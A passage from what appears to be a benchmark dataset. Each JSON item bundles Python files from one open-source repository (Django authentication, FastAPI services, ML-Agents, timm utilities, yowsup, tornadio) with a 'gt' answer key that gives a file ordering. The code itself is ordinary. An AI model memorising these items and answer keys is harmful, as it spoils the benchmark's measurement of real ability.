{\"bad_token\": (\"Token is expired or invalid\")}\n\n    def validate(self, attrs):\n        user = self.context[\"request\"].user\n        self.tokens = user.tokens()\n        return attrs\n\n    def save(self):\n        try:\n            logout(self.context[\"request\"])\n        except TokenError:\n            self.fail(\"bad_token\")\n\n\nclass UserSerializer(rfs.ModelSerializer):\n    class Meta:\n        model = User\n        fields = (\n            \"id\",\n            \"email\",\n            \"username\",\n            \"created_at\",\n            \"updated_at\",\n            \"avatar\",\n            \"is_staff\",\n        )\n\n'BuffaLogs/buffalogs/authentication/models.py'\n:from django.contrib.auth.models import AbstractBaseUser, BaseUserManager, PermissionsMixin\nfrom django.db import models\nfrom rest_framework_simplejwt.tokens import RefreshToken\n\n\nclass UserManager(BaseUserManager):\n    def create_user(self, username, email, password=None):\n        if username is None:\n            raise TypeError(\"Users should have a username\")\n        if email is None:\n            raise TypeError(\"Users should have a Email\")\n\n        user = self.model(\n            username=username,\n            email=self.normalize_email(email),\n        )\n        user.set_password(password)\n        user.save()\n        return user\n\n    def create_superuser(self, username, email, password=None):\n        if password is None:\n            raise TypeError(\"Password should not be none\")\n\n        user = self.create_user(username, email, password)\n        user.is_superuser = True\n        user.is_staff = True\n        user.save()\n        return user\n\n\nclass User(AbstractBaseUser, PermissionsMixin):\n    username = models.CharField(max_length=255, unique=True, db_index=True)\n    email = models.EmailField(max_length=255, unique=True, db_index=True)\n    is_staff = models.BooleanField(default=False)\n    is_verified = models.BooleanField(default=False)\n    created_at = models.DateTimeField(auto_now_add=True)\n    updated_at = models.DateTimeField(auto_now=True)\n    avatar = models.CharField(default=\"\", max_length=225)\n\n    USERNAME_FIELD = \"email\"\n    REQUIRED_FIELDS = [\"username\"]\n\n    objects = UserManager()\n\n    def __str__(self):\n        return self.email\n\n    def tokens(self):\n        refresh = RefreshToken.for_user(self)\n        return {\"refresh\": str(refresh), \"access\": str(refresh.access_token)}\n\n\n\n\n'BuffaLogs/buffalogs/authentication/urls.py'\n:from django.urls import path\nfrom rest_framework_simplejwt.views import TokenRefreshView\n\nfrom .views import LoginAPIView, LogoutAPIView, RegisterView\n\nurlpatterns = [\n    path(\"login\", LoginAPIView.as_view(), name=\"login\"),\n    path(\"register\", RegisterView.as_view(), name=\"register\"),\n    path(\"logout\", LogoutAPIView.as_view(), name=\"logout\"),\n    path(\"token/refresh\", TokenRefreshView.as_view(), name=\"token_refresh\"),\n]\n\n'BuffaLogs/buffalogs/authentication/views.py'\n:import logging\nimport os\n\nfrom django.contrib.auth import get_user_model\nfrom django.http import HttpResponsePermanentRedirect\nfrom django.shortcuts import render\nfrom rest_framework import generics, permissions, status\nfrom rest_framework.exceptions import AuthenticationFailed\nfrom rest_framework.response import Response\n\nfrom .serializers import LoginSerializer, LogoutSerializer, RegisterSerializer, UserSerializer\n\nlogger = logging.getLogger(__name__)\n\n\nUser = get_user_model()\n\n\nclass CustomRedirect(HttpResponsePermanentRedirect):\n    allowed_schemes = [os.environ.get(\"APP_SCHEME\"), \"http\", \"https\"]\n\n\nclass RegisterView(generics.GenericAPIView):\n\n    serializer_class = RegisterSerializer\n    authentication_classes = []\n    permission_classes = []\n\n    def post(self, request):\n        user = request.data\n        serializer = self.serializer_class(data=user)\n        serializer.is_valid(raise_exception=True)\n        serializer.save()\n        user_data = serializer.data\n        user = User.objects.get(email=user_data[\"email\"])\n\n        return Response(\n            {\n                \"status\": \"successful\",\n            },\n            status=status.HTTP_201_CREATED,\n        )\n\n\nclass LoginAPIView(generics.GenericAPIView):\n    serializer_class = LoginSerializer\n    authentication_classes = []\n    permission_classes = []\n\n    def post(self, request):\n        serializer = self.serializer_class(data=request.data)\n        serializer.is_valid(raise_exception=True)\n        data = serializer.data\n        data[\"username\"] = serializer.validated_data[\"username\"]\n        return Response(data, status=status.HTTP_200_OK)\n\n\nclass LogoutAPIView(generics.GenericAPIView):\n    serializer_class = LogoutSerializer\n    permission_classes = (permissions.IsAuthenticated,)\n\n    def post(self, request):\n\n        serializer = self.serializer_class(data=request.data, context={\"request\": request})\n        serializer.is_valid(raise_exception=True)\n        serializer.save()\n\n        return Response({\"status\": \"successful\"}, status=status.HTTP_200_OK)\n\n\nclass MeAPIView(generics.ListAPIView):\n    serializer_class = UserSerializer\n    permission_classes = (permissions.IsAuthenticated,)\n\n    def get_queryset(self):\n        user = self.request.user\n        return User.objects.filter(id=user.id)\n\n\n\n",
        "gt": [
            "'BuffaLogs/buffalogs/authentication/models.py'",
            "'BuffaLogs/buffalogs/authentication/serializers.py'",
            "'BuffaLogs/buffalogs/authentication/views.py'",
            "'BuffaLogs/buffalogs/authentication/urls.py'"
        ]
    },
    {
        "files": [
            "'tech-stack/service-2/src/app_1/internal/main.py'",
            "'tech-stack/service-2/src/app_1/internal/handlers/products.py'",
            "'tech-stack/service-2/src/app_1/internal/products/service.py'",
            "'tech-stack/service-2/src/app_1/internal/helpers/utils.py'"
        ],
        "content": "'tech-stack/service-2/src/app_1/internal/main.py'\n:import logging\n\nimport uvicorn\nfrom fastapi import FastAPI\n\nfrom app_1.internal.configs.app_1 import App1Config, load_app_1_config\nfrom app_1.internal.handlers import health, products\nfrom app_1.internal.repos.mongodb import init_mongodb\n\nlogging.basicConfig(level=logging.DEBUG)\n\napp: FastAPI = FastAPI(title=\"Tech Stack\", description=\"Technology stack\")\n\n\n@app.on_event(\"startup\")\nasync def connect_to_mongodb() -> None:\n    await init_mongodb()\n\n\napp.include_router(health.router, tags=[\"Health\"])\napp.include_router(products.router, tags=[\"Products\"])\n\nif __name__ == \"__main__\":\n    config: App1Config = load_app_1_config()\n    logging.info(f\"{config=}\")\n    print(f\"{config=}\")\n\n    uvicorn.run(\n        \"main:app\",\n        host=config.host,\n        port=config.port,\n        reload=config.reload,\n    )\n\n'tech-stack/service-2/src/app_1/internal/handlers/products.py'\n:from fastapi import status\nfrom fastapi.routing import APIRouter\n\nfrom app_1.internal.models.products import ProductCreateRequest, ProductCreateResponse, ProductFindResponse\nfrom app_1.internal.products.service import ProductService\nfrom app_1.internal.repos.products import ProductRepo\n\nrouter: APIRouter = APIRouter()\n\n\n@router.get(\n    \"/v1/products/\",\n    summary=\"Find products.\",\n    response_model=list[ProductFindResponse],\n    status_code=status.HTTP_200_OK,\n)\nasync def find() -> list[ProductFindResponse] | None:\n\n    repo: ProductRepo = ProductRepo()\n    service: ProductService = ProductService(repo)\n    return await service.find()\n\n\n@router.post(\n    \"/v1/products/\",\n    summary=\"Create products.\",\n    response_model=list[ProductCreateResponse],\n    status_code=status.HTTP_201_CREATED,\n)\nasync def create(\n    body: list[ProductCreateRequest],\n) -> list[ProductCreateResponse]:\n\n    repo: ProductRepo = ProductRepo()\n    service: ProductService = ProductService(repo)\n    return await service.create(body)\n\n'tech-stack/service-2/src/app_1/internal/products/service.py'\n:from datetime import datetime\nfrom typing import Self\n\nfrom app_1.internal.helpers.utils import get_timestamp, get_uuid\nfrom app_1.internal.models.products import ProductCreateRequest, ProductCreateResponse, ProductDB, ProductFindResponse\nfrom app_1.internal.repos.products import ProductRepo\n\n\nclass ProductService:\n    def __init__(self: Self, repo: ProductRepo) -> None:\n        self.repo: ProductRepo = repo\n\n    async def find(self: Self) -> list[ProductFindResponse]:\n        product_db: list[ProductDB] = await self.repo.find()\n        product: list[ProductFindResponse] = [ProductFindResponse.model_validate(x) for x in product_db]\n        return product\n\n    async def create(self: Self, body: list[ProductCreateRequest]) -> list[ProductCreateResponse]:\n        items: list[ProductDB] = []\n        timestamp: datetime = get_timestamp()\n        for item in body:\n            items.append(\n                ProductDB(\n                    id=get_uuid(),\n                    name=item.name,\n                    description=item.description,\n                    price=item.price,\n                    created_at=timestamp,\n                    updated_at=timestamp,\n                    deleted_at=None,\n                )\n            )\n        product_db: list[ProductDB] = await self.repo.create(items)\n        product: list[ProductCreateResponse] = [ProductCreateResponse.model_validate(x) for x in product_db]\n        return product\n\n'tech-stack/service-2/src/app_1/internal/helpers/utils.py'\n:import uuid\nfrom datetime import datetime, timezone\nfrom uuid import UUID\n\n\ndef get_timestamp() -> datetime:\n    return datetime.now(tz=timezone.utc)\n\n\ndef get_uuid() -> UUID:\n    return uuid.uuid4()\n",
        "gt": [
            "'tech-stack/service-2/src/app_1/internal/helpers/utils.py'",
            "'tech-stack/service-2/src/app_1/internal/products/service.py'",
            "'tech-stack/service-2/src/app_1/internal/handlers/products.py'",
            "'tech-stack/service-2/src/app_1/internal/main.py'"
        ]
    },
    {
        "files": [
            "'Reinforcement-Learning-With-Unity-G.E.A.R/ml-agents/__backup/trainers/__init__.py'",
            "'Reinforcement-Learning-With-Unity-G.E.A.R/ml-agents/__backup/trainers/curriculum.py'",
            "'Reinforcement-Learning-With-Unity-G.E.A.R/ml-agents/__backup/trainers/exception.py'"
        ],
        "content": "'Reinforcement-Learning-With-Unity-G.E.A.R/ml-agents/__backup/trainers/__init__.py'\n:from .buffer import *\nfrom .curriculum import *\nfrom .meta_curriculum import *\nfrom .models import *\nfrom .trainer_controller import *\nfrom .bc.models import *\nfrom .bc.trainer import *\nfrom .bc.policy import *\nfrom .ppo.models import *\nfrom .ppo.trainer import *\nfrom .ppo.policy import *\nfrom .exception import *\nfrom .policy import *\n\n'Reinforcement-Learning-With-Unity-G.E.A.R/ml-agents/__backup/trainers/curriculum.py'\n:import os\nimport json\nimport math\n\nfrom .exception import CurriculumError\n\nimport logging\n\nlogger = logging.getLogger('mlagents.trainers')\n\n\nclass Curriculum(object):\n    def __init__(self, location, default_reset_parameters):\n\n        self.max_lesson_num = 0\n        self.measure = None\n        self._lesson_num = 0\n\n\n        self._brain_name = os.path.basename(location).split('.')[0]\n\n        try:\n            with open(location) as data_file:\n                self.data = json.load(data_file)\n        except IOError:\n            raise CurriculumError(\n                'The file {0} could not be found.'.format(location))\n        except UnicodeDecodeError:\n            raise CurriculumError('There was an error decoding {}'\n                                  .format(location))\n        self.smoothing_value = 0\n        for key in ['parameters', 'measure', 'thresholds',\n                    'min_lesson_length', 'signal_smoothing']:\n            if key not in self.data:\n                raise CurriculumError(\"{0} does not contain a \"\n                                      \"{1} field.\"\n                                      .format(location, key))\n        self.smoothing_value = 0\n        self.measure = self.data['measure']\n        self.min_lesson_length = self.data['min_lesson_length']\n        self.max_lesson_num = len(self.data['thresholds'])\n\n        parameters = self.data['parameters']\n        for key in parameters:\n            if key not in default_reset_parameters:\n                raise CurriculumError(\n                    'The parameter {0} in Curriculum {1} is not present in '\n                    'the Environment'.format(key, location))\n            if len(parameters[key]) != self.max_lesson_num + 1:\n                raise CurriculumError(\n                    'The parameter {0} in Curriculum {1} must have {2} values '\n                    'but {3} were found'.format(key, location,\n                                                self.max_lesson_num + 1,\n                                                len(parameters[key])))\n\n    @property\n    def lesson_num(self):\n        return self._lesson_num\n\n    @lesson_num.setter\n    def lesson_num(self, lesson_num):\n        self._lesson_num = max(0, min(lesson_num, self.max_lesson_num))\n\n    def increment_lesson(self, measure_val):\n\n        if not self.data or not measure_val or math.isnan(measure_val):\n            return False\n        if self.data['signal_smoothing']:\n            measure_val = self.smoothing_value * 0.25 + 0.75 * measure_val\n            self.smoothing_value = measure_val\n        if self.lesson_num < self.max_lesson_num:\n            if measure_val > self.data['thresholds'][self.lesson_num]:\n                self.lesson_num += 1\n                config = {}\n                parameters = self.data['parameters']\n                for key in parameters:\n                    config[key] = parameters[key][self.lesson_num]\n                logger.info('{0} lesson changed. Now in lesson {1}: {2}'\n                            .format(self._brain_name,\n                                    self.lesson_num,\n                                    ', '.join([str(x) + ' -> ' + str(config[x])\n                                        for x in config])))\n                return True\n        return False\n\n    def get_config(self, lesson=None):\n\n        if not self.data:\n            return {}\n        if lesson is None:\n            lesson = self.lesson_num\n        lesson = max(0, min(lesson, self.max_lesson_num))\n        config = {}\n        parameters = self.data['parameters']\n        for key in parameters:\n            config[key] = parameters[key][lesson]\n        return config\n\n'Reinforcement-Learning-With-Unity-G.E.A.R/ml-agents/__backup/trainers/exception.py'\n:\n\nclass TrainerError(Exception):\n\n    pass\n\nclass CurriculumError(TrainerError):\n\n    pass\n\nclass MetaCurriculumError(TrainerError):\n\n",
        "gt": [
            "'Reinforcement-Learning-With-Unity-G.E.A.R/ml-agents/__backup/trainers/exception.py'",
            "'Reinforcement-Learning-With-Unity-G.E.A.R/ml-agents/__backup/trainers/curriculum.py'",
            "'Reinforcement-Learning-With-Unity-G.E.A.R/ml-agents/__backup/trainers/__init__.py'"
        ]
    },
    {
        "files": [
            "'fastberry/tests/apps/todo/types.py'",
            "'fastberry/src/fastberry/__init__.py'",
            "'fastberry/src/fastberry/framework.py'",
            "'fastberry/src/fastberry/spoc_admin.py'"
        ],
        "content": "'fastberry/tests/apps/todo/types.py'\n:\n\n\nfrom typing import Optional\nimport fastberry as fb\n\n\n@fb.sql.model\nclass Task:\n\n\n    title: str\n    description: str\n    status: str\n\n'fastberry/src/fastberry/__init__.py'\n:\nfrom .spoc_admin import spoc\n\nif spoc:\n    from pathlib import Path\n\n    from starlette.middleware.base import BaseHTTPMiddleware as BaseMiddleware\n    from strawberry.extensions import Extension as BaseExtension\n    from strawberry.permission import BasePermission\n\n    from .scripts import templates_code\n\n    file_settings = \"./config/docs.md\"\n    if not Path(file_settings).exists():\n        with open(file_settings, \"w\", encoding=\"utf-8\") as f:\n            f.write(templates_code.DOCS)\n\n\n    from .components import APIRouter as Router\n    from .components import cli\n    from .components import graphql as gql\n    from .framework import Fastberry as App\n\n\n    from .graphql import deleted, edges, editor, error, errors, mutation, page, query\n\n\n    from .tools import Item as item\n    from .tools import Pagination as pagination\n    from .tools import coro, doc\n\n\n    base_dir = spoc.base_dir\n    config = spoc.config\n    mode = spoc.mode\n    project = spoc.project\n    settings = spoc.settings\n\n\n    component = spoc.component\n\n    try:\n        import dbcontroller as dbc\n        from dbcontroller.forms import ISNULL\n\n        if hasattr(settings, \"DATABASES\"):\n            config_sql = settings.DATABASES.get(\"sql\")\n            config_mongo = settings.DATABASES.get(\"mongo\")\n            default_sql = config_sql.get(\"default\")\n            default_mongo = config_mongo.get(\"default\")\n            if default_sql:\n                sql = dbc.Controller(sql=default_sql)\n            if default_mongo:\n                mongo = dbc.Controller(mongo=default_mongo)\n\n\n        type = dbc.type\n\n\n        input = dbc.form.graphql\n        value = dbc.form.field\n\n\n        filters = dbc.form.filters\n\n\n        field = dbc.field\n        manager = dbc.manager\n\n\n        ID = dbc.ID\n        date = dbc.date\n        datetime = dbc.datetime\n        time = dbc.time\n        decimal = dbc.decimal\n        text = dbc.text\n        time = dbc.time\n        json = dbc.json\n\n\n        Date = dbc.Date\n\n    except ImportError:\n        import strawberry\n\n\n        type = strawberry.type\n        input = strawberry.input\n\n'fastberry/src/fastberry/framework.py'\n:\nfrom types import SimpleNamespace\n\nfrom .spoc_admin import spoc\nfrom fastapi import FastAPI\n\nfrom . import handlers\n\nPLUGINS = [\"types\", \"forms\", \"graphql\", \"router\", \"commands\"]\n\n\ndef create_api(self):\n\n\n    hide_docs = {}\n    if self.context.is_production:\n        hide_docs[\"docs_url\"] = None\n        hide_docs[\"redoc_url\"] = None\n\n    app = FastAPI(\n        title=self.info.title.title(),\n        version=self.info.version,\n        description=self.info.description,\n        **hide_docs,\n    )\n\n    self.context.app = app\n    self.context.controller = self\n\n\n@spoc.singleton\nclass Fastberry:\n\n\n    def init(\n        self,\n    ):\n\n        framework = spoc.App(plugins=PLUGINS)\n\n\n        core_toml = framework.config[\"spoc\"].get(\"spoc\", {})\n\n        self.settings = framework.settings\n        self.context = SimpleNamespace(\n            settings=framework.settings,\n            is_production=core_toml.get(\"mode\", \"development\") == \"production\",\n        )\n\n\n        self.info = handlers.api_info(\n            base_dir=framework.base_dir,\n            pyproject=framework.config[\"pyproject\"],\n            toml=framework.config[\"spoc\"],\n        )\n\n\n        create_api(self)\n        self.core = framework\n        self.extras = None\n        self.router = None\n        self.graphql = None\n        self.toml = core_toml\n\n\n        self.pagination = handlers.pagination(core_toml)\n\n\n        self.extras = handlers.extras(framework.extras.items())\n\n        if framework.component:\n\n            self.router = handlers.routers(framework.component.router.values())\n\n\n            self.types = handlers.types(framework.component.types.values())\n\n\n            self.forms = handlers.forms(framework.component.forms.values())\n\n\n            self.graphql = handlers.graphql(\n                schemas=framework.component.graphql.values(),\n                permissions=self.extras.permissions,\n            )\n\n\n            self.cli = handlers.commands(framework.component.commands.values())\n\n    def keys(self):\n\n        return sorted(\n            [\n                x\n                for x in dir(self)\n                if not x.startswith(\"_\") and x not in [\"init\", \"keys\"]\n            ]\n        )\n\n\ndef graphql_schema():\n    \"\"\"GraphQL Schema\n\n    Methods:\n        * execute\n        * execute_sync\n\n    Example:\n\n        schema.execute(\"graphql-query\", variable_values={\"key\": \"value\"})\n\n    Returns:\n        schema: GraphQL-Schema\n    \"\"\"\n    app = Fastberry()\n    return app.graphql.schema()\n\n'fastberry/src/fastberry/spoc_admin.py'\n:try:\n    import spoc\nexcept:\n    spoc = None\n",
        "gt": [
            "'fastberry/src/fastberry/spoc_admin.py'",
            "'fastberry/src/fastberry/framework.py'",
            "'fastberry/src/fastberry/__init__.py'",
            "'fastberry/tests/apps/todo/types.py'"
        ]
    },
    {
        "files": [
            "'FGVC-PIM/v0/timm/utils/clip_grad.py'",
            "'FGVC-PIM/v0/timm/utils/agc.py'",
            "'FGVC-PIM/v0/timm/utils/__init__.py'",
            "'FGVC-PIM/v0/timm/utils/cuda.py'"
        ],
        "content": "'FGVC-PIM/v0/timm/utils/clip_grad.py'\n:import torch\n\nfrom timm.utils.agc import adaptive_clip_grad\n\n\ndef dispatch_clip_grad(parameters, value: float, mode: str = 'norm', norm_type: float = 2.0):\n\n    if mode == 'norm':\n        torch.nn.utils.clip_grad_norm_(parameters, value, norm_type=norm_type)\n    elif mode == 'value':\n        torch.nn.utils.clip_grad_value_(parameters, value)\n    elif mode == 'agc':\n        adaptive_clip_grad(parameters, value, norm_type=norm_type)\n    else:\n        assert False, f\"Unknown clip mode ({mode}).\"\n\n\n'FGVC-PIM/v0/timm/utils/agc.py'\n:\nimport torch\n\n\ndef unitwise_norm(x, norm_type=2.0):\n    if x.ndim <= 1:\n        return x.norm(norm_type)\n    else:\n\n\n        return x.norm(norm_type, dim=tuple(range(1, x.ndim)), keepdim=True)\n\n\ndef adaptive_clip_grad(parameters, clip_factor=0.01, eps=1e-3, norm_type=2.0):\n    if isinstance(parameters, torch.Tensor):\n        parameters = [parameters]\n    for p in parameters:\n        if p.grad is None:\n            continue\n        p_data = p.detach()\n        g_data = p.grad.detach()\n        max_norm = unitwise_norm(p_data, norm_type=norm_type).clamp_(min=eps).mul_(clip_factor)\n        grad_norm = unitwise_norm(g_data, norm_type=norm_type)\n        clipped_grad = g_data * (max_norm / grad_norm.clamp(min=1e-6))\n        new_grads = torch.where(grad_norm < max_norm, g_data, clipped_grad)\n        p.grad.detach().copy_(new_grads)\n\n'FGVC-PIM/v0/timm/utils/__init__.py'\n:from .agc import adaptive_clip_grad\nfrom .checkpoint_saver import CheckpointSaver\nfrom .clip_grad import dispatch_clip_grad\nfrom .cuda import ApexScaler, NativeScaler\nfrom .distributed import distribute_bn, reduce_tensor\nfrom .jit import set_jit_legacy\nfrom .log import setup_default_logging, FormatterNoInfo\nfrom .metrics import AverageMeter, accuracy\nfrom .misc import natural_key, add_bool_arg\nfrom .model import unwrap_model, get_state_dict\nfrom .model_ema import ModelEma, ModelEmaV2\nfrom .random import random_seed\nfrom .summary import update_summary, get_outdir\n\n'FGVC-PIM/v0/timm/utils/cuda.py'\n:\nimport torch\n\ntry:\n    from apex import amp\n    has_apex = True\nexcept ImportError:\n    amp = None\n    has_apex = False\n\nfrom .clip_grad import dispatch_clip_grad\n\n\nclass ApexScaler:\n    state_dict_key = \"amp\"\n\n    def __call__(self, loss, optimizer, clip_grad=None, clip_mode='norm', parameters=None, create_graph=False):\n        with amp.scale_loss(loss, optimizer) as scaled_loss:\n            scaled_loss.backward(create_graph=create_graph)\n        if clip_grad is not None:\n            dispatch_clip_grad(amp.master_params(optimizer), clip_grad, mode=clip_mode)\n        optimizer.step()\n\n    def state_dict(self):\n        if 'state_dict' in amp.__dict__:\n            return amp.state_dict()\n\n    def load_state_dict(self, state_dict):\n        if 'load_state_dict' in amp.__dict__:\n            amp.load_state_dict(state_dict)\n\n\nclass NativeScaler:\n    state_dict_key = \"amp_scaler\"\n\n    def __init__(self):\n        self._scaler = torch.cuda.amp.GradScaler()\n\n    def __call__(self, loss, optimizer, clip_grad=None, clip_mode='norm', parameters=None, create_graph=False):\n        self._scaler.scale(loss).backward(create_graph=create_graph)\n        if clip_grad is not None:\n            assert parameters is not None\n            self._scaler.unscale_(optimizer)\n            dispatch_clip_grad(parameters, clip_grad, mode=clip_mode)\n        self._scaler.step(optimizer)\n        self._scaler.update()\n\n    def state_dict(self):\n        return self._scaler.state_dict()\n\n    def load_state_dict(self, state_dict):\n        self._scaler.load_state_dict(state_dict)\n",
        "gt": [
            "'FGVC-PIM/v0/timm/utils/agc.py'",
            "'FGVC-PIM/v0/timm/utils/clip_grad.py'",
            "'FGVC-PIM/v0/timm/utils/cuda.py'",
            "'FGVC-PIM/v0/timm/utils/__init__.py'"
        ]
    },
    {
        "files": [
            "'yowsup/yowsup/demos/echoclient/stack.py'",
            "'yowsup/yowsup/stacks/__init__.py'",
            "'yowsup/yowsup/demos/echoclient/__init__.py'",
            "'yowsup/yowsup/layers/protocol_media/__init__.py'"
        ],
        "content": "'yowsup/yowsup/demos/echoclient/stack.py'\n:from yowsup.stacks import  YowStackBuilder\nfrom .layer import EchoLayer\nfrom yowsup.layers import YowLayerEvent\nfrom yowsup.layers.network import YowNetworkLayer\n\n\nclass YowsupEchoStack(object):\n    def __init__(self, profile):\n        stackBuilder = YowStackBuilder()\n\n        self._stack = stackBuilder\\\n            .pushDefaultLayers()\\\n            .push(EchoLayer)\\\n            .build()\n\n        self._stack.setProfile(profile)\n\n    def set_prop(self, key, val):\n        self._stack.setProp(key, val)\n\n    def start(self):\n        self._stack.broadcastEvent(YowLayerEvent(YowNetworkLayer.EVENT_STATE_CONNECT))\n        self._stack.loop()\n\n'yowsup/yowsup/stacks/__init__.py'\n:from .yowstack import YowStack, YowStackBuilder\n\nfrom yowsup.layers.auth                        import YowAuthenticationProtocolLayer\nfrom yowsup.layers.coder                       import YowCoderLayer\nfrom yowsup.layers.logger                      import YowLoggerLayer\nfrom yowsup.layers.network                     import YowNetworkLayer\nfrom yowsup.layers.protocol_messages           import YowMessagesProtocolLayer\nfrom yowsup.layers.protocol_media              import YowMediaProtocolLayer\nfrom yowsup.layers.protocol_acks               import YowAckProtocolLayer\nfrom yowsup.layers.protocol_receipts           import YowReceiptProtocolLayer\nfrom yowsup.layers.protocol_groups             import YowGroupsProtocolLayer\nfrom yowsup.layers.protocol_presence           import YowPresenceProtocolLayer\nfrom yowsup.layers.protocol_ib                 import YowIbProtocolLayer\nfrom yowsup.layers.protocol_notifications      import YowNotificationsProtocolLayer\nfrom yowsup.layers.protocol_iq                 import YowIqProtocolLayer\nfrom yowsup.layers.protocol_contacts           import YowContactsIqProtocolLayer\nfrom yowsup.layers.protocol_chatstate          import YowChatstateProtocolLayer\nfrom yowsup.layers.protocol_privacy            import YowPrivacyProtocolLayer\nfrom yowsup.layers.protocol_profiles           import YowProfilesProtocolLayer\nfrom yowsup.layers.protocol_calls              import YowCallsProtocolLayer\nfrom yowsup.layers.noise.layer                 import YowNoiseLayer\nfrom yowsup.layers.noise.layer_noise_segments  import YowNoiseSegmentsLayer\n\n\n\nYOWSUP_CORE_LAYERS = (\n    YowLoggerLayer,\n    YowCoderLayer,\n    YowNoiseLayer,\n    YowNoiseSegmentsLayer,\n    YowNetworkLayer\n)\n\n\nYOWSUP_PROTOCOL_LAYERS_BASIC = (\n    YowAuthenticationProtocolLayer, YowMessagesProtocolLayer,\n    YowReceiptProtocolLayer, YowAckProtocolLayer, YowPresenceProtocolLayer,\n    YowIbProtocolLayer, YowIqProtocolLayer, YowNotificationsProtocolLayer,\n    YowContactsIqProtocolLayer, YowChatstateProtocolLayer\n\n)\n\nYOWSUP_PROTOCOL_LAYERS_GROUPS = (YowGroupsProtocolLayer,) + YOWSUP_PROTOCOL_LAYERS_BASIC\nYOWSUP_PROTOCOL_LAYERS_MEDIA  = (YowMediaProtocolLayer,) + YOWSUP_PROTOCOL_LAYERS_BASIC\nYOWSUP_PROTOCOL_LAYERS_PROFILES  = (YowProfilesProtocolLayer,) + YOWSUP_PROTOCOL_LAYERS_BASIC\nYOWSUP_PROTOCOL_LAYERS_CALLS  = (YowCallsProtocolLayer,) + YOWSUP_PROTOCOL_LAYERS_BASIC\nYOWSUP_PROTOCOL_LAYERS_FULL = (YowGroupsProtocolLayer, YowMediaProtocolLayer, YowPrivacyProtocolLayer, YowProfilesProtocolLayer, YowCallsProtocolLayer)\\\n                              + YOWSUP_PROTOCOL_LAYERS_BASIC\n\n\nYOWSUP_FULL_STACK = (YOWSUP_PROTOCOL_LAYERS_FULL,) +\\\n                     YOWSUP_CORE_LAYERS\n\n'yowsup/yowsup/demos/echoclient/__init__.py'\n:from .stack import YowsupEchoStack\n'yowsup/yowsup/layers/protocol_media/__init__.py'\n:from .layer import YowMediaProtocolLayer\n",
        "gt": [
            "'yowsup/yowsup/layers/protocol_media/__init__.py'",
            "'yowsup/yowsup/stacks/__init__.py'",
            "'yowsup/yowsup/demos/echoclient/stack.py'",
            "'yowsup/yowsup/demos/echoclient/__init__.py'"
        ]
    },
    {
        "files": [
            "'atlas/atlas/foundations_events/src/test/consumers/jobs/__init__.py'",
            "'atlas/atlas/foundations_events/src/test/consumers/jobs/running/__init__.py'",
            "'atlas/atlas/foundations_events/src/test/__init__.py'",
            "'atlas/atlas/foundations_events/src/test/consumers/jobs/running/test_start_time.py'",
            "'atlas/atlas/foundations_events/src/test/consumers/__init__.py'"
        ],
        "content": "'atlas/atlas/foundations_events/src/test/consumers/jobs/__init__.py'\n:\nfrom test.consumers.jobs.queued import *\nfrom test.consumers.jobs.running import *\nfrom test.consumers.jobs.completed import *\nfrom test.consumers.jobs.failed import *\n\n'atlas/atlas/foundations_events/src/test/consumers/jobs/running/__init__.py'\n:\nfrom test.consumers.jobs.running.test_remove_queued_job import TestRemoveQueuedJob\nfrom test.consumers.jobs.running.test_remove_global_queued_job import TestRemoveGlobalQueuedJob\nfrom test.consumers.jobs.running.test_start_time import TestStartTime\nfrom test.consumers.jobs.running.test_job_state import TestJobState\nfrom test.consumers.jobs.running.test_running_job_notifier import TestRunningJobNotifier\nfrom test.consumers.jobs.running.test_monitor_name import TestMonitorName\n'atlas/atlas/foundations_events/src/test/__init__.py'\n:from test.test_message_route import TestMessageRoute\nfrom test.test_message_route_listener import TestMessageRouteListener\nfrom test.test_message_router import TestMessageRouter\nfrom test.notifiers import *\nfrom test.producers import *\nfrom test.consumers import *\n\n'atlas/atlas/foundations_events/src/test/consumers/jobs/running/test_start_time.py'\n:\nimport unittest\nfrom mock import Mock\n\nfrom foundations_events.consumers.jobs.running.start_time import StartTime\n\n\nclass TestStartTime(unittest.TestCase):\n\n    def setUp(self):\n        self._redis = Mock()\n        self._consumer = StartTime(self._redis)\n\n    def test_call_saves_start_time(self):\n        self._consumer.call({'job_id': 'space pinball'}, 34344, None)\n        self._redis.set.assert_called_with(\n            'jobs:space pinball:start_time', '34344')\n\n    def test_call_saves_start_time_different_job_id(self):\n        self._consumer.call({'job_id': 'dimensional pinball'}, 34344, None)\n        self._redis.set.assert_called_with(\n            'jobs:dimensional pinball:start_time', '34344')\n\n    def test_call_saves_start_time_different_time(self):\n        self._consumer.call({'job_id': 'space pinball'}, 99999, None)\n        self._redis.set.assert_called_with(\n            'jobs:space pinball:start_time', '99999')\n\n'atlas/atlas/foundations_events/src/test/consumers/__init__.py'\n:\nfrom test.consumers.jobs import *\nfrom test.consumers.test_job_metric_consumer import TestJobMetricConsumer\nfrom test.consumers.test_job_metric_name_consumer import TestJobMetricNameConsumer\nfrom test.consumers.test_annotate import TestAnnotate\nfrom test.consumers.test_project_metrics import TestProjectMetrics\nfrom test.consumers.test_single_project_metric import TestSingleProjectMetric",
        "gt": [
            "'atlas/atlas/foundations_events/src/test/consumers/jobs/running/test_start_time.py'",
            "'atlas/atlas/foundations_events/src/test/consumers/jobs/running/__init__.py'",
            "'atlas/atlas/foundations_events/src/test/consumers/jobs/__init__.py'",
            "'atlas/atlas/foundations_events/src/test/consumers/__init__.py'",
            "'atlas/atlas/foundations_events/src/test/__init__.py'"
        ]
    },
    {
        "files": [
            "'tornadio/tornadio/session.py'",
            "'tornadio/tornadio/router.py'",
            "'tornadio/examples/transports/transports.py'"
        ],
        "content": "'tornadio/tornadio/session.py'\n:\n\n\nfrom heapq import heappush, heappop\nfrom time import time\nfrom hashlib import md5\nfrom random import random\n\nclass Session(object):\n\n\n    def __init__(self, session_id, expiry=None):\n        self.session_id = session_id\n        self.promoted = None\n        self.expiry = expiry\n\n        if self.expiry is not None:\n            self.expiry_date = time() + self.expiry\n\n    def promote(self):\n\n        if self.expiry is not None:\n            self.promoted = time() + self.expiry\n\n    def on_delete(self, forced):\n\n        pass\n\n    def __cmp__(self, other):\n        return cmp(self.expiry_date, other.expiry_date)\n\n    def __repr__(self):\n        return '%f %s %d' % (getattr(self, 'expiry_date', -1),\n                             self.session_id,\n                             self.promoted or 0)\n\ndef _random_key():\n\n    i = md5()\n    i.update('%s%s' % (random(), time()))\n    return i.hexdigest()\n\nclass SessionContainer(object):\n    def __init__(self):\n        self._items = dict()\n        self._queue = []\n\n    def create(self, session, expiry=None, **kwargs):\n\n        kwargs['session_id'] = _random_key()\n        kwargs['expiry'] = expiry\n\n        session = session(**kwargs)\n\n        self._items[session.session_id] = session\n\n        if expiry is not 